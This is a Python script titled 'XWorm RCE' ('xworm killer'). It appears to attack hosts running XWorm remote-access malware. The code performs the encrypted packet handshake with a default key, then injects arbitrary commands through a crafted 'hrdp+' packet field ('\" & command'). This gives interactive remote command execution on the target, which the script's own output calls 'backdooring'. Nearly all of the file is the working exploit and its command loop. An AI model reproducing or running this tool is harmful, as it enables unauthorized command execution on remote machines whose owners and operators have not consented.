import socket
import io
import time
import random
import string
import hashlib
import sys
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from colorama import Fore
import platform
import argparse

class Packet:
    def __init__(self, *data: list[bytes]):
        self.data = data

    def write_bytes(self, into):
        into.write(b'<Xwormmm>'.join(self.data))
    
    def get_bytes(self):
        b = io.BytesIO()
        self.write_bytes(b)
        return b.getbuffer().tobytes()

def genid(length=8):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def sendpacket(sock, packet, key):
    key_hash = hashlib.md5(key.encode('utf-8')).digest()
    crypto = AES.new(key_hash, AES.MODE_ECB)
    data = packet.get_bytes()
    encrypted = crypto.encrypt(pad(data, 16))
    sock.send(str(len(encrypted)).encode('utf-8') + b'\0')
    sock.send(encrypted)
    return encrypted
def check_work(host,port,key):
    try:
        client_id = genid()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        handshake_packet = Packet(b'hrdp', client_id.encode('utf-8'))
        sendpacket(sock, handshake_packet, key)
        time.sleep(0.5)
        ps_command = "echo hii"
        exploit_packet = Packet(
            b'hrdp+', 
            client_id.encode('utf-8'), 
            b" lol", 
            f"\" & {ps_command}".encode('utf-8'),
            b"1:1"
        )
    
        sendpacket(sock, exploit_packet, key)
        sock.close()
    
        return True
    except:
        return False
def rce(host, port, key):
    client_id = genid()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    handshake_packet = Packet(b'hrdp', client_id.encode('utf-8'))
    sendpacket(sock, handshake_packet, key)
    time.sleep(0.5)
    print("Enter your command <3")
    ps_command = input(" > ")
    exploit_packet = Packet(
        b'hrdp+', 
        client_id.encode('utf-8'), 
        b" lol", 
        f"\" & {ps_command}".encode('utf-8'),
        b"1:1"
    )
    
    sendpacket(sock, exploit_packet, key)
    sock.close()
    
    return ps_command

def main():
    parser = argparse.ArgumentParser(description='XWorm RCE')
    parser.add_argument('--host', '-H', required=True, help='Target host')
    parser.add_argument('--port', '-p', type=int, required=True, help='Target port')
    parser.add_argument('--key', '-k', required=False, help='Encryption key', default="<123456789>")
    args = parser.parse_args()
    
    print(Fore.YELLOW + f"[?] backdooring {args.host}:{args.port} with key {args.key}" + Fore.RESET)
    work = check_work(args.host,args.port,args.key)
    if work == True:
        print(Fore.GREEN + f"[+] LMAO IT WORK" + Fore.RESET)
        while True:
            print(rce(args.host, args.port, args.key))
            print(Fore.GREEN + f"[+] Execution completed" + Fore.RESET)
    else:
        print(Fore.RED + f"[-] it not work =(" + Fore.RESET)

if __name__ == "__main__":
    os.system("cls") if platform.system() == "Windows" else os.system("clear")
    print(
        Fore.RED +
        r"""  ▄████  ██▀███   ██▓▒███████▒▒███████▒ ██▓   ▓██   ██▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░▓██▒    ▒██  ██▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ ▒██░     ▒██ ██░
░▓█  ██▓▒██▀▀█▄  ░██░  ▄▀▒   ░  ▄▀▒   ░▒██░     ░ ▐██▓░
░▒▓███▀▒░██▓ ▒██▒░██░▒███████▒▒███████▒░██████▒ ░ ██▒▓░
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓  ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒░ ▒░▓  ░  ██▒▒▒ 
  ░   ░   ░▒ ░ ▒░ ▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒░ ░ ▒  ░▓██ ░▒░ 
░ ░   ░   ░░   ░  ▒ ░░ ░ ░ ░ ░░ ░ ░ ░ ░  ░ ░   ▒ ▒ ░░  
      ░    ░      ░    ░ ░      ░ ░        ░  ░░ ░     
                     ░        ░                ░ ░     
                     
                    xworm killer
                    
                    """
    )
    main()